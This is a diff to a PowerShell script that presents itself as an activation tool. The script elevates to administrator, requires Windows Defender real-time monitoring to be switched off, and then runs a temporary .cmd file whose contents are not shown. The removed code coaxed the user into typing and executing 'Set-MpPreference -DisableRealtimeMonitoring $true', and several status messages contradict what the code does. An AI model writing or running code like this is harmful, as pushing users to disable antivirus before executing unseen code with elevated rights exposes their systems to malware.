@@ -14,49 +14,6 @@ if (-not $cmdContent) {
     return
 }
 
-function Disable-Defender {
-	Write-Host "Windows defender is going to block this script from working."
-	Write-Host "Windows defender needs to be disabled for the time of activation."
-	
-	# Check if the command matches the expected format
-	# Loop until the correct command is entered
-	while ($true) {
-		# Prompt the user for input
-		$command = Read-Host "You need to rewrite this to disable Windows Defender: 'Set-MpPreference -DisableRealtimeMonitoring $true'"
-
-		# Check if the command matches the expected format
-		if ($command -eq "Set-MpPreference -DisableRealtimeMonitoring $true") {
-			Write-Host "Rewrite successful! Disabling Windows Defender..."
-			
-			# Execute the rewritten command
-			Invoke-Expression $command
-			break  # Exit the loop once the correct command is executed
-		} else {
-			Write-Host "Incorrect input. Please try again."
-		}
-	}
-
-    Write-Host "Windows Defender real-time protection is now enabled."
-}
-
-function Enable-Defender {
-	while ($true) {
-		# Prompt the user for input
-		$command = Read-Host "You need to rewrite this to disable Windows Defender: 'Set-MpPreference -DisableRealtimeMonitoring $false'"
-
-		# Check if the command matches the expected format
-		if ($command -eq "Set-MpPreference -DisableRealtimeMonitoring $false") {
-			Write-Host "Rewrite successful! Disabling Windows Defender..."
-			
-			# Execute the rewritten command
-			Invoke-Expression $command
-			break  # Exit the loop once the correct command is executed
-		} else {
-			Write-Host "Incorrect input. Please try again."
-		}
-	}
-    Write-Host "Windows Defender real-time protection is now disabled."
-}
 
 # Funkcja do sprawdzania, czy skrypt jest uruchomiony jako administrator
 function Test-Admin {
@@ -90,7 +47,16 @@ if (-not (Test-Admin)) {
     Start-Process powershell -ArgumentList "-Command $argList" -Verb RunAs
     return
 }
-Disable-Defender
+$defenderPreferences = Get-MpPreference
+
+# Check if DisableRealtimeMonitoring is set to true
+if ($defenderPreferences.DisableRealtimeMonitoring -eq $true) {
+    Write-Host "Windows Defender real-time monitoring is disabled. Continuing"
+} else {
+    Write-Host "Windows Defender real-time monitoring is enabled! Disable it in Settings and re run command!"
+	start windowsdefender://threatsettings/
+	return
+}
 
 # Tworzenie tymczasowego pliku .cmd
 $rand = [Guid]::NewGuid().Guid
@@ -103,6 +69,7 @@ CheckFile $FilePath
 # Uruchomienie pliku .cmd w tym samym oknie PowerShell (bez otwierania nowego okna)
 $process = Start-Process -FilePath "$env:SystemRoot\system32\cmd.exe" -ArgumentList "/c $FilePath" -PassThru -Wait -NoNewWindow
 
-Enable-Defender
+Write-Host "Windows Defender real-time monitoring is disabled! Enable it in Settings!"
+start windowsdefender://threatsettings/
 # Usunięcie pliku po wykonaniu
 Remove-Item $FilePath
